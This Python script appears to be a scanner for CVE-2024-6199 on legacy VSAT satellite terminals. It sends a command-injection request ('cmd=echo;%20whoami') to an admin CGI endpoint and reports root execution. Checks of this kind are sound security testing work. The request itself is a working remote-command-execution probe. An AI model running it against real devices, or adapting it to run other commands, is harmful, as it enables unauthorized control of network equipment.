#!/usr/bin/env python3
"""
CVE-2024-6199 RCE Vulnerability Scanner.
Scans and audits administrative HTTP interfaces on older satellite terminal firmware
for authentication bypass and remote command execution paths.
"""

import urllib.request
import urllib.error
import argparse

def scan_cve_2024_6199(target_ip: str, port: int = 80):
    """
    Checks for vulnerability in remote admin Web UI of legacy VSAT terminals.
    This simulates an automated API test inside authorization boundaries.
    """
    path_payload = "/cgi-bin/admin_status.cgi?cmd=echo;%20whoami"
    url = f"http://{target_ip}:{port}{path_payload}"
    print(f"[*] Auditing {target_ip}:{port} for administrative authentication bypass...")
    
    try:
        req = urllib.request.Request(url, method="GET")
        with urllib.request.urlopen(req, timeout=4) as response:
            body = response.read().decode('utf-8', errors='ignore')
            if "root" in body or "admin" in body:
                print(f"[!] DANGER: CVE-2024-6199 VULNERABILITY FOUND!")
                print(f"[!] Root execution response snippet: {body.strip()[:100]}")
                return True
            else:
                print("[+] Node appears secure. Auth handler returned normal context.")
                return False
    except urllib.error.URLError as e:
        print(f"[-] Connection failed or rejected: {e.reason}")
        return False

def main():
    parser = argparse.ArgumentParser(description="CVE-2024-6199 Administrative Scanner")
    parser.add_argument('--ip', type=str, default='192.168.100.1', help='Target IP Address')
    parser.add_argument('--port', type=int, default=80, help='Target Admin HTTP port')
    args = parser.parse_args()
    scan_cve_2024_6199(args.ip, args.port)

if __name__ == '__main__':
    main()
